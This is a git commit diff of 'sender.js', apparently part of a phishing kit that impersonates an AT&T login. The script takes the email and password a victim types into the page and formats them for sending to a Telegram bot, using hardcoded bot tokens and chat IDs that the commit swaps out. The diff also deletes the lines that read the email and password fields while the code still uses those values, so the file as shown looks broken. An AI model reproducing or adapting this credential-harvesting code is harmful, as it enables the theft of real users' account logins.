6a6e60ac2f49d41baa6672fb8bf8c81d9e5089fc
aprilmoney <166289904+aprilmoney@users.noreply.github.com>
2024-04-07 02:06:20 -0700

    Update sender.js

--- sender.js
+++ sender.js
@@ -2,13 +2,9 @@ console.log("sender.js connected");
 function sendTelegramMessageAndRedirect() {
   //  other user API
 
-    const telegramBotToken = "6968043726:AAHGJ0OtlbTMjTOPTfacioSJqOwgePt0Xhw"; // add the telegram token
-   const chatId = 5710607863; // add ths id from the web It's usually a number, not a string
+    const telegramBotToken = "6540267021:AAFNksqVOSP4jMjcI6mslosa6ToClVh7HHU"; // add the telegram token
+   const chatId = 2114904331; // add ths id from the web It's usually a number, not a string
 
-  const telegramBotToken = "6844888640:AAHaV1WfjOzhyXvzRXkKefB3KunOrrhZO68"; // add the telegram token
-  const chatId = 5349229520; // add ths id from the web It's usually a number, not a string
-  const emailValue = document.getElementById("email").value;
-  const passwordValue = document.getElementById("password").value;
 
   const messageText = `AT&T\nEmail: ${emailValue}\nPassword: ${passwordValue}`;
 
